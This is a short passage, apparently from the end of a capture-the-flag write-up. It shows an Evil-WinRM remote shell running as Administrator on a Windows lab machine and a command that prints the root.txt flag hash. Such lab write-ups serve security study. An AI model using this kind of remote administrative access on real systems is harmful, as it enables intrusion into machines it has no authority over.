*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

## root.txt

```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
5845210f5f1ba3f9506ae70026ec1851
```
